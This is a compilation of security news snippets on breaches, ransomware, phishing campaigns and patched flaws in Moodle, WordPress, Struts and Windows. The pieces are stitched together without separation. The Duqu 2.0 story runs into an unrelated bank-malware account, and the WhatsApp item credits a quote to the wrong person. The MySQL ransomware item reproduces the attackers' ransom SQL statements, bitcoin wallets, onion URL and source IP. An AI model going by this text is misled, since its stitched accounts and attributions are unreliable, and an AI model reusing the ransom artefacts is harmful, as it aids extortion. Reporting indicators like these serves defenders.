ABCD’s IT Company successfully removed the virus and all corrupt data from its servers. Secure backup data stored separately from ABCD’s servers and computers was not compromised by this incident, and it was used to restore all affected data. As a result, no confidential information was lost or destroyed, including protected health information. Also, please note that ABCD never received any ransom demands or other communications from unknown persons. However, ABCD remains concerned because it discovered user logs indicating that computer programs or persons may have been on the server for a limited period of time. In addition to notifying its patients, ABCD notified the Federal Bureau of Investigations (“FBI”), and it will notify the Department of Health and Human Services.
While ABCD’s IT Company found no evidence that confidential information was actually acquired or removed from its servers and computers, it could not rule out the possibility that confidential information may have been viewed and possibly was acquired. Importantly, ABCD cannot confirm with a high degree of likelihood that confidential information remained secure throughout this incident. Generally, affected information may have included one’s name, address, telephone, date of birth, other demographic information, Social Security Number, insurance billing information, current procedural technology codes, medical records, and laboratory reports.
ABCD takes its patient’s privacy and the security of their information very seriously. ABCD had a variety of security measures in place before this incident, including network filtering and security monitoring, intrusion detection systems, firewalls, antivirus software, and password protection. Following this incident, ABCD’s IT Company located the source of the intrusion and implemented several measures to ensure this kind of incident does not occur again, which include state of the art cyber monitoring on its network. ABCD and its IT Company continue to assess its physical and cyber security.
We have arranged with Equifax Personal Solutions to help protect the identity and credit information of all patients. Patients can call 844-420-6493 Monday through Friday from 9:00 AM to 9:00 PM Eastern Standard Time to determine whether they were affected. Also, if any patient has questions, they can call this same number to speak with a customer service representative about the incident.
Patients also can place a fraud alert on their credit files with the three major credit reporting agencies.  A fraud alert is a consumer statement added to one’s credit report. The fraud alert signals creditors to take additional steps to verify one’s identity prior to granting credit.  This service can make it more difficult for someone to get credit in one’s name, though it may also delay one’s ability to obtain credit while the agency verifies identity.
Fraud alerts are free and last 90 days unless you manually renew it or use the automatic fraud alert feature within a Credit Watch subscription. Patients also may want to order their credit report. By establishing a fraud alert, patients will receive a follow-up letter that will explain how they can receive a copy of their credit report. When patients receive their credit report, examine it closely and look for signs of fraud, such as credit accounts that are incorrect. Even though a fraud alert has been placed on their account, patients should continue to monitor future credit reports to ensure an imposter has not opened an account. If patients want to place a security freeze, they will need to call all three credit bureaus (information listed above) and place a security freeze on thier credit report. Charges to place and/or remove a security freeze vary by state and credit agency.
We deeply regret any inconvenience this incident may have caused. If patients have questions, please call 844-420-6493 Monday through Friday from 9:00 AM to 9:00 PM Eastern Standard Time.

One of the biggest and most popular social networking platforms, Snapchat, has once again become the center of attention. But this time, it is for all the wrong reasons with tweets and hashtags (#Uninstall_Snapchat and #BoycottSnapchat) urging people to get rid of the app.
Apparently, the outrage started in India, after one of Snapchat’s former employees said that the CEO of the company had no intention to expand the business to India since the Snapchat platform is meant for “rich people” and not for “poor countries” like India and or Spain. Enraged India first reacted on Twitter, and after that, the hacktivist group Anonymous India claimed that they were responsible for 1.7 million Snapchat users’ data leak.
The hacking group has supposedly found vulnerabilities in Snapchat’s systems and managed to steal 1.7 million user data and leaked them on the dark web. It seems that the hackers belong to one of the many bug bounty hunting groups that are finding flaws in systems of big companies in exchange for money.
It appears that the flaw in Snapchat’s security was discovered last year, but never reported to the authorities. Now, the same flaw was used to steal Snapchat users data, reports DailyMail. The hackers are also demanding that the CEO apologize or an intensive strike against Snapchat will be launched. So far, Snapchat itself hasn’t confirmed any data leaks and we’re still waiting for an official comment from the social media giant.
So far, the company has claimed that the allegations are ridiculous and that the app is available worldwide for everyone who wishes to use it. A spokesperson for the company has denied everything that Snapchat is being accused of.
Despite this, the outrage on the social media continues, and many are still persuading others to boycott the application, or better yet – to completely uninstall it. The ratings of the company have dropped down fast, and the app is currently rated with only one star on the Apple’s App Store, while before this ‘incident’ it had a full five-star rating. And when it comes to Google Play Store, the app has a four-star rating at the time of writing. It’s unknown what will happen with the company now that their reputation has dropped down so dramatically, but whatever they decide to do to fix this, they better do it fast.

Claims of a backdoor in WhatsApp that could be used for third-party snooping were shot down by WhatsApp, which called the allegations false.
On Friday, news outlet The Guardian reported that a cryptography researcher had discovered a backdoor in WhatsApp’s messaging service that could “allow Facebook and others to intercept and read encrypted messages”.
In a short statement, WhatsApp said the claim was false:
“WhatsApp does not give governments a ‘backdoor’ into its systems and would fight any government request to create a backdoor.
The design decision referenced in The Guardian story prevents millions of messages from being lost, and WhatsApp offers people security notifications to alert them to potential security risks.
WhatsApp published a technical white paper on its encryption design, and has been transparent about the government requests it receives, publishing data about those requests in the Facebook Government Requests Report”.
The Guardian report cited research by Tobias Boelter, a cryptography and security researcher at the University of California, Berkeley.
Last April, Boelter disclosed his findings to WhatsApp and published a report on what he posited could be either a backdoor or a flaw in WhatsApp’s messaging platform.
Boelter later told The Guardian the “backdoor” gave WhatsApp the ability to read messages because of the way the company had implemented its end-to-end encryption protocol.
Reporters quoted Kirstie Ball, co-director and founder of the Centre for Research into Information, Surveillance and Privacy who verified Boelter’s research and stated the “backdoor” made WhatsApp an “an extremely insecure platform”.
The Guardian explains Boelter’s alleged backdoor like this:
WhatsApp’s end-to-end encryption relies on the generation of unique security keys, using the acclaimed Signal protocol, developed by Open Whisper Systems, that are traded and verified between users to guarantee communications are secure and cannot be intercepted by a middleman.
However, WhatsApp has the ability to force the generation of new encryption keys for offline users, unbeknown to the sender and recipient of the messages, and to make the sender re-encrypt messages with new keys and send them again for any messages that have not been marked as delivered.
The recipient is not made aware of this change in encryption, while the sender is only notified if they have opted-in to encryption warnings in settings, and only after the messages have been re-sent.
This re-encryption and rebroadcasting effectively allows WhatsApp to intercept and read users’ messages.
WhatsApp, acquired by Facebook in 2014, supports end-to-end encryption and is considered a secure messaging platform based on the highly regarded Signal protocol, developed by Open Whisper Systems.
The app boasts one billion users and has been endorsed by the likes of Edward Snowden for keeping private messages private.
Claims of a WhatsApp backdoor have been staunchly dismissed by a number security researchers and cryptography experts.
Moxie Marlinspike, the founder of Open Whisper Systems also agrees with WhatsApp telling Threatpost, “The Guardian reporting is inaccurate, there is no ‘backdoor’ in WhatsApp encryption.
Unfortunately it appears that they did not speak with any cryptography experts in order to verify their claims”.
Marlinspike also posted a more technical explanation behind what Boelter found.
In a nutshell, he explains what Boelter says is a backdoor is actually something all public key cryptography system have to deal with.
“WhatsApp gives users the option to be notified when those changes occur,” he wrote.
Frederic Jacobs, a key developer of the private messaging app Signal, called the claims of a backdoor “ridiculous”.
In a tweet he said “It’s ridiculous that this is presented as a backdoor.
If you don’t verify keys, authenticity of keys is not guaranteed.
It's ridiculous that this is presented as a backdoor.
If you don't verify keys, authenticity of keys is not guaranteed.
— Frederic Jacobs (@FredericJacobs) January 13, 2017
Jacobs and other security researchers explain the “backdoor” is a feature designed to allow WhatsApp users who obtain a new phone to reinstall the WhatsApp app and continue a preexisting conversation thread.
There is a renegotiation of encryption keys allows for the continuity of WhatsApp conversations.
The WhatsApp sender is only notified of the change in encryption if they have opted-in to an encryption warning setting within settings.
Marlinspike and other security experts say snooping on WhatsApp’s re-encrypting of messages by Facebook or any other agency would be extremely difficult and improbable.
In post to his personal site Friday he doubled-down on his assertion that what he found was a flaw.
“WhatsApp has stated recently that this is not a bug, it is a feature.
Because now senders don’t have to press an extra ‘OK’ button in the rare case they sent a message, the receiver is offline and has a new phone when coming back online,” he said.
I agree that it’s a flaw, but calling it a backdoor is hyperbole.
Remember, Moxie removed SMS encryption from his previous app TextSecure because of the same reasons that the current flaw exists: it is difficult to have secure conversations with people wtih changing phones, changing apps, etc.

Further ReadingStepson of Stuxnet stalked Kaspersky for months, tapped Iran nuke talksTwo years ago, researchers at Moscow-based Kaspersky Lab discovered their corporate network was infected with malware that was unlike anything they had ever seen.
Virtually all of the malware resided solely in the memory of the compromised computers, a feat that had allowed the infection to remain undetected for six months or more.
Kaspersky eventually unearthed evidence that Duqu 2.0, as the never-before-seen malware was dubbed, was derived from Stuxnet, the highly sophisticated computer worm reportedly created by the US and Israel to sabotage Iran’s nuclear program.
The Kaspersky Lab researchers still don't know if a single group of individuals is behind the attacks, or if they're being carried out by competing hacker gangs.
The use of the fileless malware and command-server domains that aren't associated with any whois data makes the already difficult task of attribution almost impossible.
The researchers first discovered the malware late last year, when a bank's security team found a copy of Meterpreter—an in-memory component of Metasploit—residing inside the physical memory of a Microsoft domain controller.
After conducting a forensic analysis, the researchers found that the Meterpreter code was downloaded and injected into memory using PowerShell commands.
The infected machine also used Microsoft's NETSH networking tool to transport data to attacker-controlled servers.
To obtain the administrative privileges necessary to do these things, the attackers also relied on Mimikatz.
To reduce the evidence left in logs or hard drives, the attackers stashed the PowerShell commands into the Windows registry.
Fortunately, the evidence on the domain controller was intact, presumably because it hadn't been restarted before Kaspersky Lab researchers began their investigation.
An analysis of the dumped memory contents and the Windows registries allowed the researchers to restore the Meterpreter and Mimikatz code.
The attackers, the researchers later determined, had used the tools to collect passwords of system administrators and for the remote administration of infected host machines.

A recent lull in the distribution of spam spreading information-stealing malware via the Hancitor downloader has been snapped.
Researchers at the SANS Internet Storm Center are currently tracking an increase in spam purporting to be a forwarded parking ticket notification.
The message prompts the recipient to click a link to pay a parking ticket; the hyperlink is to a Microsoft Word document.
“The document contains a malicious VB macro described has Hancitor, Chanitor or Tordal,” wrote Brad Duncan, handler at the SANS Internet Storm Center in blog post warning of the spam campaign.
“If you enable macros, the document retrieves a Pony downloader DLL.
The Pony downloader then retrieves and installs Vawtrak malware”.

Officials in Mecklenburg, N.C. must make a difficult decision by 1 p.m. ET on Wednesday: They must choose whether to pay two bitcoins—currently worth about $25,000—to hackers who are holding the county’s computer files for ransom, [Update: they refused to pay].
The situation is the latest example of cyber criminals deploying a form of software known as ransomware, which freezes up files on a computer network until someone enters a decryption code to unlock them. Typically, the code can only be obtained by paying the hackers.
An official for the county, which encompasses the city of Charlotte, said the ransomware was triggered when an employee clicked on an email attachment, and that it is wrecking havoc with daily operations:
“She said an example of the problem is the county’s code enforcement office, where much of the work is done electronically. Employees no longer have access to their records. But she said they are switching to paper records for work on Wednesday,” according to the Charlotte Observer.
The official also explained that the county faces a dilemma in deciding whether to pay. While paying the ransom may be the only way to obtain the decryption key, there is no guarantee the hackers will honor their commitment and provide the key.
The anonymous hackers do not appear to have targeted Mecklenburg county in particular, but rather the official thinks the attack was launched as part of a broader money-making scheme involving ransomware.
Similar attacks, which typically exploit old Microsoft software, struck millions of computers in two separate waves earlier this year, affecting everything from businesses to governments to hospitals. While most of the incidents occurred in Europe and Asia, U.S. organizations were hit too—including a transit system in Sacramento, Calif. and a hospital in Los Angeles.

For all the sophisticated tactics, techniques, and procedures employed by threat actors these days, phishing continued to be the top attack vector in 2016, as it has been for some time.
The big difference was that instead of targeting financial services companies, phishers increasingly targeted cloud storage service providers like Google and DropBox, security vendor PhishLabs said in a voluminous report on phishing trends released this week.
Compared to 2013, when barely 10% of phishing attacks targeted cloud storage services, about 22.5% of phishing attacks last year involved such companies.
That was just barely below the 23% of phishing scams involving financial brands, the company noted.
What that means is that users are likely going to get more phishing emails this year trying to get them to part with credentials to their cloud storage credentials.
""Over the last four years, the number of phishing attacks targeting cloud storage services has skyrocketed,"" says Crane Hassold, senior security threat researcher at PhishLabs.
""Based on recent trends, it is likely that phishing attacks targeting cloud storage services will overtake financial institutions as the top target for phishers in 2017.""
So far at least, almost all phishing attacks impacting this industry have involved only Google and DropBox.
Many of the phishing campaigns targeting cloud storage providers contain lures saying that a document or picture has been shared with the victim and encourage them to sign in to their account in order to view it.
A majority of the phishing pages involved in such campaigns have really been poor duplicates of the pages used by Google, DropBox, and other legitimate sites.
Even so, ""based on the growing popularity of these types of attacks, phishers must still be having success compromising victim even with this lack of authenticity,"" Hassold says.
The PhishLabs report is based on an analysis of some one million confirmed phishing sites spread across more than 170,000 unique domains, and also from the company’s handling of more than 7,800 phishing attacks per month in 2016.
The analysis showed an alarming increase across the board in phishing-related activities.
The number of phishing sites in 2016, for instance, was 23% higher than the year before, while the volume of phishing emails grew by an average of 33% across financial services, cloud storage/file hosting, webmail/online, payment services, and ecommerce sites.
PhishLabs identified a total of 976 brands belonging to 568 organizations that cybercriminal used in phishing campaigns last year.
The kind of data that phishers went after also broadened considerably last year.
In addition to account credentials and personal data, phishers also used their phishing lures to try and snag financial, employment, and account security data like answers to challenge/response questions and mother’s maiden name.
Ransomware's Best Friend
In 2016, phishing also continued to be by far the most prevalent method for delivering ransomware on everything from end user systems to systems belonging to businesses, government agencies, schools, and critical infrastructure targets.
The use of email as an authentication measure made it easier for phishers to mass harvest credentials for all email services on a single phishing site, instead of having to target email providers individually, Hassold says.
""Additionally, because a growing number of Web services are using email as a primary credential, phishers are able to multiply their profits by conducting password reuse attacks against these unsuspecting targets,"" he says.
The easy availability of phish kits, or ready-to-use templates for creating working phishing sites, contributed to the problem.
Many of these kits included sophisticated anti-detection mechanisms.
Mechanisms included access control measures based on IP address, HTTP referrer, and hostname, whitelists, and blocklists.
""The big takeaway is that we’ve created ideal conditions for the mass harvesting of credentials via phishing attacks,"" Hassold notes.
Unlike in the past where phishers were focused on immediate gains—by going after and selling access to financial accounts for instance—they are now trying to maximize the information they can compromise with the least effort.

A flaw in the mobile Safari browser has been exploited by cybercriminals and used to extort money from individuals who have previously used their mobile device to view pornography or other illegal content. The Safari scareware prevents the user from accessing the Internet on their device by loading a series of pop-up messages.
A popup is displayed advising the user that Safari cannot open the requested page. Clicking on OK to close the message triggers another popup warning. Safari is then locked in an endless loop of popup messages that cannot be closed.
A message is displayed in the background claiming the device has been locked because the user has been discovered to have viewed illegal web content. Some users have reported messages containing Interpol banners, which are intended to make the user think the lock has been put on their phone by law enforcement. The only way of unlocking the device, according to the messages, is to pay a fine.
One of the domains used by the attackers is police-pay.com; however, few users would likely be fooled into thinking the browser lock was implemented by a police department as the fine had to be paid in the form of an iTunes gift card.
Other messages threaten the user with police action if payment is not made. The attackers claim they will send the user’s browsing history and downloaded files to the Metropolitan Police if the ransom is not paid.

Unit 42, Palo Alto Networks’ threat intelligence research arm, has uncovered evidence of links between attacks using two new malware families and two families of Google Android malware.
This has been discovered as part of work on preventing and detecting targeted attacks in the Middle East.
The attackers favour using URL shortening services to disguise the true links they are sending in spear phishing emails.
A number of samples analysed were linked via the URL shortening service “bit.ly”.
The URL shortening service then redirects users to the malicious payload hosted on attacker controlled pages.
Another method favoured by the attackers was the setting up of fake news sites.

The company acknowledged the investigation after being contacted by Brian Krebs, confirming that it received a “notification from a third party” saying that info from cards used at GameStop.com were being offered for sale on the Dark Web.
Krebs had been tipped off to the situation by financial industry sources, who said the compromise was likely active between mid-September 2016 and the first week of February 2017.
GameStop however didn’t confirm these data points.
“If Brian Krebs’ report is correct, the GameStop breach has the potential to be a huge payday for hackers,” said Vishal Gupta, CEO of Seclore, via email.
“Compromised credit-card numbers aren’t always easy to monetize, but in this case hackers were able to intercept CVV2 numbers…There is a reason companies aren’t allowed to store this CVV2 data in their own databases, so the fact that the hackers were able to intercept these security codes elevates the severity of the incident significantly”.
The timing could also be a key factor in the payoff for the crooks.
“If the reports about the Gamestop.com breach are right, then it shows how business-minded the bad guys can be.
Hitting them during the Christmas season—when tons of distant relatives buying kids they hardly know gift cards for the one thing they know every kid wants—is pretty savvy timing,” said Jonathan Sander, CTO, STEALTHbits Technologies.
“It also means these are purchases that many will barely recall making, and consumers were exercising the least caution they ever do as they rushed to get all their online shopping done”.
For now, details are skimpy as to what was stolen, when and how—no attack vector has yet been public.
However, the company is large and hugely popular in the United States, with a global presence, so the potential for consumer exposure at scale, if the timeframe given is correct, could be significant.
""You can imagine a future where attacks such as this become so sophisticated and frequent that no one but the largest retailers can afford to defend against them,” said John Gunn, CMO, VASCO Data Security.
“This would give the Amazons and Walmarts of the world a real competitive advantage in winning consumers’ business.""
GameStop shoppers are advised to comb their purchase histories.

Zero-day vulnerability could have allowed attackers to hijack a Windows system.
Microsoft has patched a major zero-day vulnerability in Windows, the second such exploit detected in just a few weeks.
The threat, the second such alert in just a month, was spotted by security experts at Kaspersky Lab and fixed as part of Microsoft's monthly Patch Tuesday release.
Kaspersky Lab says the exploit had already been utilised for a number of cyberattacks in the Middle East, and was detected by the company's Automatic Exploit Prevention technology.
The vulnerability, officially named by Microsoft as CVE-2018-8589, targeted the 32-bit version of Windows 7, and could have allowed attackers to gain ""elevated privileges"" and create exploits to gain access to a victim's system and run malicious code.
The news comes just a few weeks after Kaspersky Lab detected a similar zero-day threat in Microsoft's system, having alerted the computing giant to a further Windows vulnerability that had been utilised by state-backed cyber-espionage group known as FruityArmor.
“Autumn 2018 became quite a hot season when it comes to zero-day vulnerabilities,"" said Anton Ivanov, Security Expert at Kaspersky Lab. 
""In just a month, we discovered two of their kind and detected two series of attacks in one region. Discreteness of cyberthreat actors’ activities remind us that it is of critical importance for companies to have in their possession all necessary tools and solutions that would be intelligent enough  to protect them from such sophisticated threats. Otherwise, they could become a subject to complex targeted attacks that will come out of nowhere.""

A critical vulnerability in Moodle, an open source PHP-based learning management system deployed across scores of schools and universities, could expose the server its running on to compromise.
Tens of thousands of universities worldwide, including the California State University system, the University of Oxford, and Stanford University, use the service to provide students with course outlines, grades, and other personal data.
The issue–at its root a SQL injection vulnerability–could be used by an attacker to execute PHP code on a university’s server according to Netanel Rubin, the researcher who found the bug.
Rubin, who has previously dug up vulnerabilities in Mozilla’s Bugzilla bug tracking system, e-commerce platform Magento, and WordPress, described the bug in depth in a blog post on Monday.
“Similar scenarios could be used in previous versions of Moodle but only by managers/admins and only via web services,” the advisory reads.
School IT administrators are being encouraged to apply a patch that maintainers of the system pushed 10 days ago.
Rubin discovered that he could exploit the feature however and get an unserialize call by leaving a preference in a block mechanism empty.
That could open the door to an object injection attack.
While the attack had its limitations, Rubin discovered a way to pivot from it to a series of method calls.
From there, he found he could use the system’s “update” method to update any row in an affected database.
This gave him the ability to tweak administrator accounts, passwords, the site configuration, “basically whatever we want,” he wrote.
Rubin used a double SQL injection to top off his exploit, helping him gain full administrator privileges on any server running Moodle.
“After gaining full administrator privileges executing code is as simple as uploading a new plugin or template to the server,” Rubin writes.

Google said it has disabled offending accounts involved in a widespread spree of phishing emails today impersonating Google Docs.
The emails, at the outset, targeted journalists primarily and attempted to trick victims into granting the malicious application permission to access the user’s Google account. It’s unknown how many accounts were compromised, or whether other applications are also involved. Google advises caution in clicking on links in emails sharing Google Docs.

The messages purport to be from a contact, including contacts known to the victim, wanting to share a Google Doc file. Once the “Open in Docs” button is clicked, the victim is redirected to Google’s OAUTH2 service and the user is prompted to allow the attacker’s malicious application, called “Google Docs,” below, to access their Google account and related services, including contacts, Gmail, Docs and more.

“We have taken action to protect users against an email impersonating Google Docs, and have disabled offending accounts,” a Google spokesperson told Threatpost. “We’ve removed the fake pages, pushed updates through Safe Browsing, and our abuse team is working to prevent this kind of spoofing from happening again. We encourage users to report phishing emails in Gmail.”
OAUTH is an authentication standard that allows a user to authorize third party applications access to an account. The attempt to steal OAUTH tokens is a departure from traditional phishing attacks that target passwords primarily. Once the attacker has access to the victim’s account, the phishing message is sent along to the compromised contact list.
While this attack is likely the work of a spammer, nation-state attackers including APT28, aka Fancy Bear or Sofacy, have made use of this tactic. APT28 has been linked to last summer’s attacks attempting to influence the U.S. presidential elections. The group has long been targeting political entities, including NATO, and uses phishing emails, backdoors and data-stealing malware to conduct espionage campaigns against its targets.
“I don’t believe they are behind this though because this is way too widespread,” said Jaime Blasco, chief scientist at AlienVault. “Many people and organizations have received similar attempts, so this is probably something massive and less targeted.”

 The engineering firm refused to meet the hackers’ demands and the Daily Echo understands it lost access to vital data including personal information about its staff, who number around 100.
Businesses have been warned that such ‘ransomware’ attacks are on the rise and that companies need to train all staff to be vigilant.
Police said an East Dorset company – which the Echo is not naming – had reported on June 1 that it was the victim of computer fraud. 
 “It was reported that their computer was hacked and a demand was made for £120,000,” a Dorset Police spokeswoman said.
“The victim was referred to Action Fraud to report.”
Ian Girling, chief executive of Dorset Chamber of Commerce and Industry, said: “Cyber crime is on the increase and all companies are vulnerable to attack.
“What’s really important is that staff are trained because it’s quite often staff opening emails and dealing with stuff. Responsibility doesn’t just lie with IT departments. All staff need to be aware of the potential threat to the business.
“There are lots of good companies in Dorset to help businesses with this.”
The incident echoes the WannaCry ransomware attack which infected an estimated 200,000 computers globally last year, including up to 70,000 in the NHS.
Matt Horan, security director of C3IA Solutions in Poole – one of the first companies to be certified by the government’s National Cyber Security Centre – said: “You should never pay a ransom because there is no guarantee you will get your data back. During an attack the data doesn’t go anywhere, it is just encrypted and you need a decryption key or algorithm to unlock it and get it back.
“If you pay a criminal to return your data there is a good chance that he or she will take the money and not decrypt the data – or even ask for more money.
 “It’s important to back up all data and to ensure it’s backed up without the virus or ransomware in it. Therefore all backups should be virus checked prior to storage off-site.“You do not want to clean your system of the malware only to re-introduce the same problem from your back-up. It’s also important to regularly check the back-up to ensure data can be recovered from it.”
General Sir Chris Deverell, commander of the UK’s Joint Forces Command, warned yesterday of cyber threats from abroad, which could target infrastructure such as power stations and air traffic control. “We must make sure our cyber security is constantly improving,” he said.
“It’s a very important thing and every sector of society is very focused on it.”

Last week I ran across a very successful phishing campaign, what’s odd in most ways it was nothing special.
The attacker was using this more like a worm, where stolen credentials would be used within the hour to start sending out a mass amount of more phishes.
I've decided to call this ""Dynamite Phishing"" because there is nothing quiet about this at all.
It seems about 40% of the credentials were used for more mailings, and the other account's credentials had not been used.
The initial phishes came in from a K12 domain from several affected individuals.
The email subject was  “You have an Incoming Document Share With You Via Google Docs”.
The contents of the email were base64 encoded, while it appears to be common Content-Transfer-Encoding, it's not something I typically run into especially when looking at Phishes.
The link in the document went to ""hxxp://bit.ly/2kZJbW3"" which went to hxxp://jamesrichardsquest.co.nf/lib
The landing page was setup as a generic Outlook Web Access 2013 login page.
It appears the EM_Client is a pretty popular email client, but it maybe something you can block on depending on your environment.
user-agent: eM_Client/7.0.27943.0
While most people have good protections from Emails coming from external entities into their email environment, many don’t push the same protections intra-domain.
The volume of email sent from the Phished accounts to other Internal accounts is what made this so successful.

Last week we first tweeted that the GuardiCore Global Sensor Network (GGSN) has detected a wide ransomware attack targeting MySQL databases.
The attacks look like an evolution of the MongoDB ransomware attacks first reported earlier this year by Victor Gevers.
Similarly to the MongoDB attacks, owners are instructed to pay a 0.2 Bitcoin ransom (approx.$200) to regain access to their content.
We saw two very similar variations of the attack using two bitcoin wallets.
In this post we will describe in detail the attack flow and provide some recommendations on how to protect your databases from similar attacks along with attack IoCs.
The attacks started at midnight at 00:15 on February 12 and lasted about 30 hours in which hundreds of attacks were reported by GGSN.
We were able to trace all the attacks to 109.236.88.20, an IP address hosted by worldstream.nl, a Netherlands-based web hosting company.
The attacker is (probably) running from a compromised mail server which also serves as HTTP(s) and FTP server.
Worldstream was notified a few days after we reported the attack.
The attack starts with ‘root’ password brute-forcing.
Once logged-in, it fetches a list of the existing MySQL databases and their tables and creates a new table called ‘WARNING’ that includes a contact email address, a bitcoin address and a payment demand.
In one variant of the attack the table is added to an existing database; in other cases the table is added to a newly created database called ‘PLEASE_READ’.
The attacker will then delete the databases stored on the server and disconnect, sometimes without even dumping them first.
The attack as reported by GuardiCore Centra
We logged two versions of the ransom message:
INSERT INTO PLEASE_READ.`WARNING`(id, warning, Bitcoin_Address, Email) VALUES(‘1′,’Send 0.2 BTC to this address and contact this email with your ip or db_name of your server to recover your database!
Your DB is Backed up to our servers!’, ‘1ET9NHZEXXQ34qSP46vKg8mrWgT89cfZoY’, ‘backupservice@mail2tor.com’)

VALUES(1, ‘SEND 0.2 BTC TO THIS ADDRESS 1Kg9nGFdAoZWmrn1qPMZstam3CXLgcxPA9 AND GO TO THIS SITE http://sognd75g4isasu2v.onion/ TO RECOVER YOUR DATABASE!
The second version offers the owner to visit the following darknet web site ‘http://sognd75g4isasu2v.onion/’ to recover the lost data.
The darknet web site referenced in the ransom note.
Each version uses a different bitcoin wallet, 1Kg9nGFdAoZWmrn1qPMZstam3CXLgcxPA9 vs 1ET9NHZEXXQ34qSP46vKg8mrWgT89cfZoY and based on Blockchain public information people have been paying up.

  DORCHESTER hospital workers have been caught up in a high-level cyber-security attack that has put hundreds at risk across the country.
Computer hackers have stolen private files from the company Landauer, which is employed by the NHS to monitor radiation levels among staff.
They hold personal details such as names, dates of birth, national insurance numbers and radiation dose of workers across the county including from Dorset County Hospital (DCH).
Fortunately fewer than 55 employees at DCH were affected.
The company confirmed the attack, which has left hundreds of people across the country vulnerable to identity fraud, did not just affect the NHS but a ‘number of clients’.
The government’s newly formed National Cyber Security Centre (NCSC) set up to fight the rising threat of cyber-attacks refused to reveal information about the hackers including where they were from or exactly how many people are affected.
The NCSC tackled 188 attacks in its first three months.
A spokesperson for Dorset County Hospital said: “On January 19 2017 Dorset County Hospital NHS Foundation Trust received a letter which informed us that there had been an information security breach on one of the servers at Landauer UK, a third party organisation who supply our Dosimetry service, an externally provided service that monitors, analyses and reports on the radiation dosages that staff who regularly use radioactive equipment and devices are exposed to.
“The incident occurred in October 2016 and has affected Trusts and non-NHS organisations nationwide, including Dorset County Hospital.
Fortunately the number of staff from DCHFT who were involved in this data security breach was small, with fewer than 55 current or former employees affected.
Of these employees, fewer than 10 had more than their name breached, and all of these individuals have been offered a 12 month ‘ProtectMyID’ service via Experian, courtesy of Landauer.

 WordPress 5.0 users are being urged to update their CMS software to fix a number of serious bugs. The update (WordPress 5.0.1) addresses seven flaws and was issued Thursday, less than a week after WordPress 5.0 was released.
The most serious of the flaws is a bug that allows the WordPress “user activation screen” to be indexed by Google and other search engines, leading to the possible public exposure of WordPress usernames and passwords.
“The user activation screen could be indexed by search engines in some uncommon configurations, leading to exposure of email addresses, and in some rare cases, default generated passwords,” wrote security firm Wordfence in a blog post outlining the flaws.
Wordfence said all WordPress users running versions of the 4.x branch of WordPress core are also impacted by similar issues. It urges those 4.x users, not ready to update to the 5.0 branch, to install the WordPress 4.9.9 security update (also released this week), which addresses similar bugs.
Three of the bugs fixed with the release of WordPress 5.0.1 are cross-site scripting (XSS) vulnerabilities. Two of the XSS bugs could allow for an adversary to launch a privilege escalation attack.
“Contributors could edit new [WordPress web-based] comments from higher-privileged users, potentially leading to a cross-site scripting vulnerability,” Wordfence wrote. “This is another vulnerability that requires a higher-level user role, making the likelihood of widespread exploitation quite low. WordPress addressed this issue by removing the <form> tag from their HTML whitelist.”
WordPress plugins are potentially impacted by a third XSS bug that opens up sites to attacks launched by adversaries who send specially crafted URLs to affected sites. According to researchers, the bug doesn’t impact WordPress 5.0 directly, rather the “wpmu_admin_do_redirect” function used by some WordPress plugins.
“Specially crafted URL inputs could lead to a cross-site scripting vulnerability in some circumstances,” they said.
A PHP (Hypertext Preprocessor) bug was also identified by WordPress. This bug is more technical in nature and was found by Sam Thomas, of Secarma Labs, who publicly disclosed it at the 2018 Black Hat conference.
“This vulnerability allows an author to assign an arbitrary file path to an attachment. The file path supplied by the author uses the phar:// stream wrapper on a previously uploaded attachment which leads to object injection utilizing a “feature” of the PHAR file type which stores serialized objects in the metadata of the PHAR file,” wrote Wordfence.
WordPress is also warning users of a unauthorized file deletion bug and an unauthorized post creation bug.

Oracle released its latest Critical Patch Update on July 18, fixing 334 vulnerabilities across the company's product portfolio. The company rated 61 of the vulnerabilities as having critical impact.
Among the products patched by Oracle are Oracle Database Server, Oracle Global Lifecycle Management, Oracle Fusion Middleware, Oracle E-Business Suite, Oracle PeopleSoft, Oracle Siebel CRM, Oracle Industry Applications, Oracle Java SE, Oracle Virtualization, Oracle MySQL and Oracle Sun Systems Products Suite. While there are issues of varying severity in the update, Oracle is blaming third-party components as being the cause of the majority of the critical issues.
""It is fair to note that bugs in third-party components make up a disproportionate amount of severe vulnerabilities in this Critical Patch Update,"" Eric Maurice, director of security assurance at Oracle, wrote in a blog post. ""90 percent of the critical vulnerabilities addressed in this Critical Patch Update are for non-Oracle CVEs."" 
Of the 334 issues fixed in the July Critical Patch Update, 37 percent were for third-party components included in Oracle product distributions.
While many flaws were from third-party libraries, there were also flaws in Oracle's own development efforts. Oracle's namesake database was patched for three issues, one of which is remotely exploitable without user authentication.
Oracle's Financial Services application received the highest total number of patches at 56, with 21 identified as being remotely exploitable without user authentication. Oracle's Fusion Middleware, on the other hand, got 44 new security fixes, with 38 of them rated as being critical. Oracle Enterprise Manager Products were patched for 16 issues, all of which are remotely exploitable without authentication.
Looking at flaws in Java, Oracle's July CPU provides eight security fixes, though organizations likely need to be cautious when applying the patches, as certain functionality has been removed.
""Several actions taken to fix Java SE vulnerabilities in the July CPU are likely to break the functionality of certain applications,"" security firm Waratek warned in an advisory. ""Application owners who apply binary patches should be extremely cautious and thoroughly test their applications before putting patches into production.""
The reason why the Oracle fixes could break application functionality is because Oracle has decided to remove multiple vulnerable components from its Java Development Kit (JDK).
At 334 fixed flaws, the July update is larger than last Critical Patch Update released on Jan 15, which provided patches for 237 flaws. While the number of patches issues has grown, Matias Mevied, Oracle security researcher at Onapsis, commented that Oracle is working in the right way, fixing the reported vulnerabilities and is getting faster every year.
""Unfortunately, based in our experience, the missing part is that the companies still don't implement the patches as soon as they should be,"" Mevied told eWEEK.

Apache Struts is a free and open-source framework used to build Java web applications.
We looked into past several Remote Code Execution (RCE) vulnerabilities reported in Apache Struts, and observed that in most of them, attackers have used Object Graph Navigation Language (OGNL) expressions.
The use of OGNL makes it easy to execute arbitrary code remotely because Apache Struts uses it for most of its processes.
Using OGNL, a researcher found a new remote code execution vulnerability in Apache Struts 2, designated as CVE-2017-5638.
An exploit has been reported to be already in the wild.

A hacker has stolen millions of accounts from Dueling Network, a now-defunct Flash game based on the Yu-Gi-Oh trading card game.
Although Dueling Network itself shut down in 2016 in response to a cease-and-desist order, the site's forum continued running until recently.
The message currently displayed on the Dueling Network forum.
""Only our forum site was still up as a way for our users to communicate with each other (login used DN [Dueling Network] credentials).
Now that is down and warns users to change passwords on any other sites they may have used the same password on,"" Black Luster Soldier, a Dueling Network administrator, told Motherboard in an email.
